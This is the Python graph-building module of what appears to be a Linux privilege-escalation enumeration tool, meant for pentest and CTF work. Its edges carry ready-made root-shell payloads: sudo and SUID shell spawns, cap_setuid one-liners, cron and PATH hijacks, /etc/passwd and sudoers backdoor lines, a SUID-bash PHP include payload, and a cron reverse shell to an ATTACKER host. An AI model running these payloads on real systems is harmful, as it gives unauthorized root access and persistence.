"""Translate collected ``Facts`` into an escalation ``Graph``.

Every edge created here represents a concrete, evidence-backed way for one
principal to act as another. The graph builder is where individually-benign
facts get joined into compound relationships -- e.g. a group you're in, a file
that group can write, and a root job that runs that file.
"""
from __future__ import annotations

import re

from chainmail.facts import Facts
from chainmail.knowledge import gtfobins
from chainmail.knowledge import groups as groupkb
from chainmail.graph.model import (
    Edge, Graph, user_node, group_node,
    MEMBERSHIP, SUDO, SUID, CAPABILITY, GROUP_PRIV, WRITABLE_EXEC,
    PATH_HIJACK, SENSITIVE_WRITE, KERNEL_EXPLOIT, INCLUDE_HIJACK,
)

ROOT = "root"
SETUID_INTERPRETERS = ("python", "python2", "python3", "perl", "ruby", "php", "node")


def build_graph(facts: Facts) -> Graph:
    g = Graph()
    me = facts.current_user or "current-user"
    g.add_node(user_node(me), is_start=True, label=me)
    g.add_node(user_node(ROOT), is_goal=True, label=ROOT)

    _add_memberships(g, facts, me)
    _add_group_privileges(g, facts)
    _add_sudo(g, facts, me)
    _add_suid(g, facts, me)
    _add_capabilities(g, facts, me)
    _add_scheduled_writes(g, facts, me)
    _add_include_hijacks(g, facts, me)
    _add_sensitive_writes(g, facts, me)
    _add_kernel_exploits(g, facts, me)
    return g


# --------------------------------------------------------------------------
def _add_memberships(g: Graph, facts: Facts, me: str) -> None:
    for grp in facts.current_groups:
        if grp == me:
            continue
        g.add_node(group_node(grp), label=grp)
        g.add_edge(Edge(
            src=user_node(me), dst=group_node(grp), category=MEMBERSHIP,
            title=f"member of group '{grp}'",
            detail="from `id`",
        ))


def _add_group_privileges(g: Graph, facts: Facts) -> None:
    # Edge from a group to the principal that membership lets you become.
    # We add these for every group the current user is in (and root-group too).
    for grp in facts.current_groups:
        esc = groupkb.lookup(grp)
        if not esc:
            continue
        g.add_edge(Edge(
            src=group_node(grp), dst=user_node(esc.target), category=GROUP_PRIV,
            title=f"'{grp}' group privilege",
            detail=esc.summary,
            poc=esc.poc,
            requires=esc.requires,
        ))


def _add_sudo(g: Graph, facts: Facts, me: str) -> None:
    for rule in facts.sudo_rules:
        for runas in rule.runas_users:
            tag = "" if rule.nopasswd else " (password required)"
            for cmd in rule.commands:
                if cmd == "ALL":
                    g.add_edge(Edge(
                        src=user_node(me), dst=user_node(runas), category=SUDO,
                        title=f"sudo ALL as {runas}{tag}",
                        detail="sudo -l permits running any command",
                        poc=(f"sudo -u {runas} /bin/sh" if runas != ROOT else "sudo /bin/sh"),
                        requires="" if rule.nopasswd else "valid password",
                    ))
                    continue
                bin_path = cmd.split()[0]
                base = bin_path.rsplit("/", 1)[-1]
                poc = gtfobins.poc_for(bin_path, "sudo", runas)
                if poc:
                    g.add_edge(Edge(
                        src=user_node(me), dst=user_node(runas), category=SUDO,
                        title=f"sudo {base} as {runas}{tag}",
                        detail=f"sudo rule allows {bin_path}; {base} is a GTFOBin",
                        poc=poc,
                        requires="" if rule.nopasswd else "valid password",
                    ))
                else:
                    # Even without a GTFOBin, if we can write the sudo-run
                    # script, that's an escalation. Flag it as a lead.
                    if _is_writable(facts, bin_path):
                        g.add_edge(Edge(
                            src=user_node(me), dst=user_node(runas), category=SUDO,
                            title=f"sudo writable script as {runas}{tag}",
                            detail=f"sudo runs {bin_path}, which you can modify",
                            poc=f"echo '#!/bin/sh' > {bin_path}; echo '/bin/sh' >> {bin_path}; "
                                f"sudo {cmd}",
                            requires="" if rule.nopasswd else "valid password",
                        ))


def _add_suid(g: Graph, facts: Facts, me: str) -> None:
    for b in facts.suid_binaries:
        # Only SUID (4000) yields the owner's identity; pure SGID is weaker and
        # handled implicitly via group writability elsewhere.
        if not b.mode.startswith("4") and "4" not in b.mode[:2]:
            # crude: many `find -printf %m` give 4 in the leading digit
            if not (len(b.mode) == 4 and b.mode[0] == "4"):
                pass
        poc = gtfobins.poc_for(b.path, "suid", b.owner)
        if poc and b.owner != me:
            g.add_edge(Edge(
                src=user_node(me), dst=user_node(b.owner), category=SUID,
                title=f"SUID {b.path.rsplit('/', 1)[-1]} (owner {b.owner})",
                detail=f"{b.path} is SUID and a GTFOBin",
                poc=poc,
            ))


def _add_capabilities(g: Graph, facts: Facts, me: str) -> None:
    for c in facts.capabilities:
        if "cap_setuid" not in c.caps.lower():
            continue
        base = c.path.rsplit("/", 1)[-1]
        interp = next((i for i in SETUID_INTERPRETERS if base.startswith(i)), None)
        if not interp:
            continue
        poc = {
            "python": f"{c.path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "perl": f"{c.path} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
            "ruby": f"{c.path} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
            "php": f"{c.path} -r 'posix_setuid(0); system(\"/bin/sh\");'",
            "node": f"{c.path} -e 'process.setuid(0); require(\"child_process\").spawn"
                    f"(\"/bin/sh\",{{stdio:[0,1,2]}})'",
        }.get(interp.rstrip("23"), f"{c.path}  # use cap_setuid to setuid(0)")
        g.add_edge(Edge(
            src=user_node(me), dst=user_node(ROOT), category=CAPABILITY,
            title=f"cap_setuid on {base}",
            detail=f"{c.path} has capabilities '{c.caps}'",
            poc=poc,
        ))


def _add_scheduled_writes(g: Graph, facts: Facts, me: str) -> None:
    """The chaining core: writable input -> job -> the job's owner.

    For each scheduled job we find the executable it runs. If the current
    principal (directly, or via one of its groups) can write that file or its
    directory, we add an edge to the job's owner. Because group writability
    produces an edge *from the group node*, these compose with membership edges
    to form multi-hop chains.
    """
    writable_index = _writable_index(facts)
    for job in facts.scheduled_jobs:
        exe = _job_executable(job.command)
        if not exe:
            continue
        owner = job.owner if job.owner not in ("", "ALL") else ROOT

        # 0) incron: the watched path is the *trigger*. Writing it only injects
        # into a root context when the command actually consumes the watched
        # file's content/name (incron wildcards $@/$#, or the path appears in
        # the command). When the command is instead a fixed root helper script
        # -- the HTB "Connected" case -- the real code-exec comes from a
        # hijackable include in that script, handled by _add_include_hijacks
        # (which carries the trigger), so we do NOT emit a misleading root edge
        # here.
        if job.kind == "incron" and job.trigger_path and _consumes_watched_file(job):
            t_hit = (writable_index.get(job.trigger_path)
                     or writable_index.get(_parent(job.trigger_path)))
            if t_hit:
                g.add_edge(Edge(
                    src=_writer_source(t_hit.writable_via, me),
                    dst=user_node(owner), category=WRITABLE_EXEC,
                    title=f"inject via incron-watched file run by {owner}",
                    detail=f"{job.source}: incrond runs '{job.command}' as {owner} "
                           f"on changes to {job.trigger_path}, and the command "
                           f"consumes that file; writable via {t_hit.writable_via}",
                    poc=(f"# command processes the watched file; craft input it will "
                         f"execute, then:\n"
                         f"touch {job.trigger_path}  # fires incrond as {owner}"),
                    requires="incrond running; depends on how the command parses the file",
                ))

        # 1) direct file / parent-dir writability
        hit = writable_index.get(exe) or writable_index.get(_parent(exe))
        if hit:
            src = _writer_source(hit.writable_via, me)
            g.add_edge(Edge(
                src=src, dst=user_node(owner), category=WRITABLE_EXEC,
                title=f"write {job.kind} target run by {owner}",
                detail=f"{job.source} runs '{exe}' as {owner}; "
                       f"writable via {hit.writable_via} ({hit.note})",
                poc=f"echo '#!/bin/sh' > {exe}; echo '/bin/sh -i' >> {exe}  "
                    f"# wait for {owner}'s {job.kind} to fire",
                requires=f"{job.kind} must execute (timing)",
            ))

        # 2) PATH hijack: job calls a bare command name and a $PATH dir is writable
        if not exe.startswith("/") and facts.writable_path_dirs:
            wdir = facts.writable_path_dirs[0]
            g.add_edge(Edge(
                src=user_node(me), dst=user_node(owner), category=PATH_HIJACK,
                title=f"PATH hijack of {job.kind} run by {owner}",
                detail=f"{job.source} runs bare command '{exe}' as {owner}; "
                       f"writable $PATH dir {wdir} precedes its real location",
                poc=f"printf '#!/bin/sh\\n/bin/sh -i\\n' > {wdir}/{exe}; "
                    f"chmod +x {wdir}/{exe}  # wait for {owner}'s {job.kind}",
                requires=f"{wdir} must precede the real binary in {owner}'s $PATH; timing",
            ))


def _add_sensitive_writes(g: Graph, facts: Facts, me: str) -> None:
    handlers = {
        "/etc/passwd": (
            "overwrite /etc/passwd to add a root-equivalent account",
            "openssl passwd -1 -salt x pass  # then append "
            "'evil:$1$x$...:0:0::/root:/bin/sh' to /etc/passwd; su evil",
        ),
        "/etc/shadow": (
            "rewrite root's password hash in /etc/shadow",
            "replace root's hash with a known one (openssl passwd -6 ...), then su root",
        ),
        "/etc/sudoers": (
            "grant yourself NOPASSWD ALL in sudoers",
            f"echo '{me} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers; sudo -l",
        ),
        "/etc/ld.so.preload": (
            "preload a malicious shared object into every root process",
            "build a .so with a setuid(0) constructor, write its path to "
            "/etc/ld.so.preload, trigger any SUID binary",
        ),
        "/etc/crontab": (
            "add a root cron entry",
            f"echo '* * * * * root /bin/sh -c \"id > /tmp/p\"' >> /etc/crontab",
        ),
    }
    dir_handlers = {
        "/etc/sudoers.d": (
            "drop a NOPASSWD sudoers file",
            f"echo '{me} ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/zz; sudo -l",
        ),
        "/etc/cron.d": (
            "drop a root cron job",
            "echo '* * * * * root /bin/sh -i >/dev/tcp/ATTACKER/443 0<&1' > /etc/cron.d/zz",
        ),
        "/etc/ld.so.conf.d": (
            "add a library search path you control",
            "point ld at a writable dir, plant a malicious libc-resolved .so",
        ),
    }
    for wt in facts.writable_targets:
        title_poc = handlers.get(wt.path)
        if title_poc and "[parent dir writable]" not in wt.note:
            summary, poc = title_poc
            g.add_edge(Edge(
                src=_writer_source(wt.writable_via, me), dst=user_node(ROOT),
                category=SENSITIVE_WRITE,
                title=f"write {wt.path}",
                detail=f"{summary} (writable via {wt.writable_via})",
                poc=poc,
            ))
        dir_tp = dir_handlers.get(wt.path)
        if dir_tp:
            summary, poc = dir_tp
            g.add_edge(Edge(
                src=_writer_source(wt.writable_via, me), dst=user_node(ROOT),
                category=SENSITIVE_WRITE,
                title=f"write into {wt.path}/",
                detail=f"{summary} (writable via {wt.writable_via})",
                poc=poc,
            ))


def _add_kernel_exploits(g: Graph, facts: Facts, me: str) -> None:
    """Turn CVE-enrichment findings into direct user->root exploit edges.

    Only findings classified as local-root vectors (curated DB) or flagged as
    wild-exploited become edges, since a chain must actually reach root. Each
    edge carries the public PoC reference and a 'verify' caveat -- chainmail
    reports leads, it does not run exploits.
    """
    for f in facts.vuln_findings:
        if not (getattr(f, "local_root", False) or getattr(f, "wild_exploited", False)):
            continue
        flags = []
        if getattr(f, "wild_exploited", False):
            flags.append("wild-exploited")
        if getattr(f, "epss", None) is not None:
            flags.append(f"EPSS {f.epss:.2f}")
        if getattr(f, "cvss", None) is not None:
            flags.append(f"CVSS {f.cvss}")
        flag_str = f"  [{', '.join(flags)}]" if flags else ""
        conf = getattr(f, "confidence", "lead")
        g.add_edge(Edge(
            src=user_node(me), dst=user_node(ROOT), category=KERNEL_EXPLOIT,
            title=f"{f.cve} {f.name} ({f.component}) [{conf} confidence]",
            detail=f"{f.summary} source={f.source}{flag_str}",
            poc=f"public PoC: {f.reference}" if f.reference else
                f"search Exploit-DB / GitHub for {f.cve}",
            requires=f.requires or "confirm the target is unpatched before relying on this",
        ))


def _add_include_hijacks(g: Graph, facts: Facts, me: str) -> None:
    """Edges for files included/sourced by a root-run script that we control.

    This is the corrected HTB "Connected" model: a root incron helper script
    require_once()s a PHP file that is missing under a writable directory. We
    create the include with a malicious class (matching the script's
    ``new Class()->method()`` call) and fire the trigger.
    """
    for h in facts.hijackable_includes:
        src = _writer_source(h.writable_via, me)
        verb = "create" if h.state == "missing-writable-parent" else "overwrite"
        title = f"{verb} {h.language} include used by root script"
        detail = (f"{h.script_path} (runs as {h.owner} via {h.job_kind} "
                  f"{h.job_source}) includes {h.include_path}; {h.state} "
                  f"(writable via {h.writable_via})")
        if h.invoke_hint:
            detail += f"; script invokes {h.invoke_hint}"
        g.add_edge(Edge(
            src=src, dst=user_node(h.owner), category=INCLUDE_HIJACK,
            title=title, detail=detail,
            poc=_include_hijack_poc(h),
            requires=_include_requires(h),
        ))


def _consumes_watched_file(job) -> bool:
    """Heuristic: does an incron command actually use the watched file?"""
    cmd = job.command or ""
    if any(tok in cmd for tok in ("$@", "$#", "$%", "$&")):
        return True
    return bool(job.trigger_path and job.trigger_path in cmd)


def _php_payload(invoke_hint: str) -> str:
    root = "exec('cp /bin/bash /tmp/rootbash'); exec('chmod +s /tmp/rootbash');"
    if "::" in invoke_hint:
        cls, meth = invoke_hint.split("::", 1)
        return (f"<?php class {cls} {{ function {meth}() {{ {root} }} }}")
    if invoke_hint:                       # class known, method unknown
        return (f"<?php /* {invoke_hint} */ {root}  "
                f"// if a method is required, wrap in the class/method the script calls")
    return f"<?php {root} ?>"             # executed at include time


def _include_hijack_poc(h) -> str:
    steps: list[str] = []
    if h.state == "missing-writable-parent":
        steps.append(f"mkdir -p {h.include_path.rsplit('/', 1)[0]}")
    if h.language == "php":
        steps.append(f"cat > {h.include_path} <<'PHP'\n{_php_payload(h.invoke_hint)}\nPHP")
    elif h.language == "shell":
        steps.append(f"printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash; "
                     f"chmod +s /tmp/rootbash\\n' > {h.include_path}")
    elif h.language == "perl":
        steps.append(f"echo 'system(\"cp /bin/bash /tmp/rootbash; "
                     f"chmod +s /tmp/rootbash\"); 1;' > {h.include_path}")
    if h.job_kind == "incron" and h.trigger_path:
        steps.append(f"echo trigger > {h.trigger_path}   # fire incrond as {h.owner}")
    steps.append("sleep 3; /tmp/rootbash -p   # then: id")
    return "\n".join(steps)


def _include_requires(h) -> str:
    if h.job_kind == "incron" and h.trigger_path:
        return (f"incrond running; create the include BEFORE firing "
                f"{h.trigger_path}; confirm the script reaches the include")
    return f"{h.job_kind or 'job'} must run {h.script_path}"


# --------------------------------------------------------------------------
def _writable_index(facts: Facts):
    return {wt.path: wt for wt in facts.writable_targets}


def _writer_source(writable_via: str, me: str) -> str:
    if writable_via.startswith("group:"):
        return group_node(writable_via.split(":", 1)[1])
    return user_node(me)


def _is_writable(facts: Facts, path: str) -> bool:
    idx = {wt.path for wt in facts.writable_targets}
    return path in idx or _parent(path) in idx


def _parent(path: str) -> str:
    return path.rsplit("/", 1)[0] or "/"


def _job_executable(command: str) -> str | None:
    # (returns the path an event/time job executes; incron joins on trigger_path)
    if not command.strip():
        return None
    # strip common shell wrappers: "/bin/sh -c '...'", "/bin/bash -c ..."
    m = re.match(r"^\S*/?(?:sh|bash|dash)\s+-c\s+['\"]?(\S+)", command)
    if m:
        return m.group(1)
    # otherwise the first token is the executable
    token = command.strip().split()[0]
    # ignore env-var assignments prefix (FOO=bar cmd)
    while "=" in token and not token.startswith("/"):
        rest = command.strip().split()
        if len(rest) < 2:
            return None
        command = " ".join(rest[1:])
        token = command.strip().split()[0]
    return token
